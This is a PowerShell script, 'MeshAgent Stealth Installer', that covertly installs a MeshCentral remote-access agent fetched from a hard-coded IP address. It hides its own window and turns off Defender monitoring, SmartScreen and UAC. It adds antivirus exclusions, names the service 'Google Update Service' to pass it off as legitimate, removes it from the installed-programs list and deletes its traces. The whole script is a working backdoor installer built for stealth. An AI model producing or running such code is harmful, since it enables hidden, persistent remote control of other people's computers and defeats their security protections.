# MeshAgent Stealth Installer
# Complete silent installation with all bypasses
# Usage: Run as Administrator from CMD:
# powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File stealth-install.ps1

param(
    [string]$ServerUrl = "wss://85.158.110.250:8080/agent.ashx",
    [string]$ServiceName = "google",
    [string]$DisplayName = "Google Update Service",
    [string]$MeshName = "MyComputers",
    [string]$MeshType = "2",
    [string]$MeshID = "",
    [string]$ServerID = "",
    [string]$AdminUser = "admin",
    [string]$AdminPass = ""
)

# Hide PowerShell window
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0) # 0 = SW_HIDE

# Create log file
$logFile = "$env:TEMP\mesh_install.log"
function Log($msg) {
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $msg" | Out-File -FilePath $logFile -Append
}

Log "Starting stealth installation"

# Check admin rights
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Log "ERROR: Not running as administrator"
    exit 1
}

# Function to get MeshID from server
function Get-MeshIDFromServer {
    param(
        [string]$ServerIP,
        [int]$ServerPort,
        [string]$Username,
        [string]$Password
    )
    
    Log "Getting MeshID from server..."
    
    try {
        # Create WebSocket connection
        $ws = New-Object System.Net.WebSockets.ClientWebSocket
        $ct = New-Object System.Threading.CancellationToken($false)
        
        # Connect to server
        $connectTask = $ws.ConnectAsync([Uri]"wss://${ServerIP}:${ServerPort}/", $ct)
        $connectTask.Wait()
        
        if ($ws.State -ne [System.Net.WebSockets.WebSocketState]::Open) {
            Log "Failed to connect to server"
            return $null
        }
        
        # Send login request
        $loginMsg = @{
            action = "login"
            username = $Username
            password = $Password
        } | ConvertTo-Json
        
        $sendBytes = [System.Text.Encoding]::UTF8.GetBytes($loginMsg)
        $sendBuf = New-Object System.ArraySegment[byte] -ArgumentList @(,$sendBytes)
        $ws.SendAsync($sendBuf, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $ct).Wait()
        
        # Receive response
        $recvBuf = New-Object byte[] 1024
        $recvSeg = New-Object System.ArraySegment[byte] -ArgumentList @(,$recvBuf)
        $result = $ws.ReceiveAsync($recvSeg, $ct)
        $result.Wait()
        
        $response = [System.Text.Encoding]::UTF8.GetString($recvBuf, 0, $result.Result.Count)
        $loginResp = $response | ConvertFrom-Json
        
        if ($loginResp.result -ne "ok") {
            Log "Login failed: $response"
            $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "done", $ct).Wait()
            return $null
        }
        
        # Request mesh list
        $meshMsg = @{
            action = "meshes"
        } | ConvertTo-Json
        
        $sendBytes = [System.Text.Encoding]::UTF8.GetBytes($meshMsg)
        $sendBuf = New-Object System.ArraySegment[byte] -ArgumentList @(,$sendBytes)
        $ws.SendAsync($sendBuf, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $ct).Wait()
        
        # Receive mesh list
        $result = $ws.ReceiveAsync($recvSeg, $ct)
        $result.Wait()
        
        $response = [System.Text.Encoding]::UTF8.GetString($recvBuf, 0, $result.Result.Count)
        $meshResp = $response | ConvertFrom-Json
        
        # Close connection
        $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "done", $ct).Wait()
        
        if ($meshResp.meshes -and $meshResp.meshes.Count -gt 0) {
            # Return first mesh ID
            $mesh = $meshResp.meshes[0]
            Log "Found mesh: $($mesh.name) (ID: $($mesh._id))"
            return $mesh._id
        }
        
        Log "No meshes found"
        return $null
        
    } catch {
        Log "Error getting MeshID: $_"
        return $null
    }
}

# Function to get ServerID from certificate
function Get-ServerIDFromCert {
    param(
        [string]$ServerIP,
        [int]$ServerPort
    )
    
    Log "Getting ServerID from certificate..."
    
    try {
        # Download root certificate
        $certUrl = "https://${ServerIP}:${ServerPort}/MeshServerRootCert.cer"
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
        
        $webClient = New-Object System.Net.WebClient
        $certBytes = $webClient.DownloadData($certUrl)
        
        # Create X509 certificate
        $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($certBytes)
        
        # Get SHA384 fingerprint
        $hash = $cert.GetCertHashString([System.Security.Cryptography.HashAlgorithmName]::SHA384)
        $serverId = $hash -replace ':', ''
        
        Log "ServerID: $serverId"
        return $serverId
        
    } catch {
        Log "Error getting ServerID: $_"
        return $null
    }
}

try {
    # Step 1: Bypass execution policy
    Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force

    # Step 1.5: Auto-get MeshID and ServerID if not provided
    $serverIp = "85.158.110.250"
    $serverPort = 8080
    
    if ([string]::IsNullOrEmpty($ServerID)) {
        Log "ServerID not provided, getting from server..."
        $ServerID = Get-ServerIDFromCert -ServerIP $serverIp -ServerPort $serverPort
        if ([string]::IsNullOrEmpty($ServerID)) {
            Log "ERROR: Failed to get ServerID"
            exit 1
        }
        Log "Auto-got ServerID: $ServerID"
    }
    
    if ([string]::IsNullOrEmpty($MeshID)) {
        Log "MeshID not provided, getting from server..."
        if ([string]::IsNullOrEmpty($AdminPass)) {
            Log "ERROR: AdminPass required for auto-getting MeshID"
            exit 1
        }
        $MeshID = Get-MeshIDFromServer -ServerIP $serverIp -ServerPort $serverPort -Username $AdminUser -Password $AdminPass
        if ([string]::IsNullOrEmpty($MeshID)) {
            Log "ERROR: Failed to get MeshID"
            exit 1
        }
        Log "Auto-got MeshID: $MeshID"
    }

    # Step 2: Disable security features temporarily
    Log "Disabling security features..."
    
    # Disable SmartScreen
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -Value 0 -Force -ErrorAction SilentlyContinue
    
    # Disable Windows Defender real-time protection
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
    
    # Add exclusion for temp folder
    Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath "C:\Program Files" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath "C:\Program Files (x86)" -ErrorAction SilentlyContinue
    
    # Disable UAC
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force -ErrorAction SilentlyContinue
    
    # Step 3: Generate .msh file
    Log "Generating .msh configuration..."
    $mshContent = @"
MeshName=$MeshName
MeshType=$MeshType
MeshID=$MeshID
ServerID=$ServerID
MeshServer=$ServerUrl
"@
    $mshPath = "$env:TEMP\meshagent.msh"
    $mshContent | Out-File -FilePath $mshPath -Encoding ASCII
    
    # Step 4: Download agent
    Log "Downloading agent..."
    $agentPath = "$env:TEMP\svcupdate.exe"
    
    # Try multiple download methods
    $downloaded = $false
    
    # Method 1: WebClient
    try {
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0")
        $webClient.DownloadFile("https://85.158.110.250:8080/meshagents?script=1", $agentPath)
        $downloaded = $true
        Log "Downloaded via WebClient"
    } catch {
        Log "WebClient failed: $_"
    }
    
    # Method 2: Invoke-WebRequest
    if (-not $downloaded) {
        try {
            [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
            Invoke-WebRequest -Uri "https://85.158.110.250:8080/meshagents?script=1" -OutFile $agentPath -UseBasicParsing
            $downloaded = $true
            Log "Downloaded via Invoke-WebRequest"
        } catch {
            Log "Invoke-WebRequest failed: $_"
        }
    }
    
    # Method 3: BITS transfer
    if (-not $downloaded) {
        try {
            Import-Module BitsTransfer
            Start-BitsTransfer -Source "https://85.158.110.250:8080/meshagents?script=1" -Destination $agentPath
            $downloaded = $true
            Log "Downloaded via BITS"
        } catch {
            Log "BITS failed: $_"
        }
    }
    
    if (-not $downloaded) {
        Log "ERROR: All download methods failed"
        exit 1
    }
    
    # Step 5: Embed .msh file into agent
    Log "Embedding .msh configuration into agent..."
    $agentWithMsh = "$env:TEMP\svcupdate_msh.exe"
    Copy-Item -Path $agentPath -Destination $agentWithMsh -Force
    
    # Use MeshAgent's built-in .msh embedding
    $embedArgs = "--copy-msh=`"1`" -fullinstall"
    $process = Start-Process -FilePath $agentWithMsh -ArgumentList $embedArgs -Wait -PassThru -WindowStyle Hidden
    Log "Installation with .msh completed with exit code: $($process.ExitCode)"
    
    # Fallback: If embedding failed, install without .msh
    if ($process.ExitCode -ne 0) {
        Log "Trying installation without .msh embedding..."
        $process = Start-Process -FilePath $agentPath -ArgumentList "-fullinstall" -Wait -PassThru -WindowStyle Hidden
        Log "Installation completed with exit code: $($process.ExitCode)"
    }
    
    # Step 5: Wait for service to start
    Start-Sleep -Seconds 5
    
    # Step 6: Hide from Programs and Features
    Log "Hiding from Programs and Features..."
    $uninstallKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\$ServiceName"
    if (Test-Path $uninstallKey) {
        Remove-Item -Path $uninstallKey -Recurse -Force
        Log "Removed uninstall key"
    }
    
    # Also remove from 32-bit path
    $uninstallKey32 = "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\$ServiceName"
    if (Test-Path $uninstallKey32) {
        Remove-Item -Path $uninstallKey32 -Recurse -Force
        Log "Removed 32-bit uninstall key"
    }
    
    # Step 7: Rename service display name to look legitimate
    Log "Renaming service..."
    $serviceKey = "HKLM:\SYSTEM\CurrentControlSet\Services\$ServiceName"
    if (Test-Path $serviceKey) {
        Set-ItemProperty -Path $serviceKey -Name "DisplayName" -Value $DisplayName -Force
        Set-ItemProperty -Path $serviceKey -Name "Description" -Value "Google Update Service" -Force
        Log "Service renamed to: $DisplayName"
    }
    
    # Step 8: Restore security settings
    Log "Restoring security settings..."
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -Value 1 -Force -ErrorAction SilentlyContinue
    Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring $false -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 1 -Force -ErrorAction SilentlyContinue
    
    # Remove exclusions
    Remove-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue
    
    # Step 9: Clean up
    Log "Cleaning up..."
    Remove-Item -Path $agentPath -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $agentWithMsh -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $mshPath -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $logFile -Force -ErrorAction SilentlyContinue
    
    Log "Installation complete!"
    
} catch {
    Log "ERROR: $_"
    # Restore security settings on error
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -Value 1 -Force -ErrorAction SilentlyContinue
    Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 1 -Force -ErrorAction SilentlyContinue
    exit 1
}

exit 0
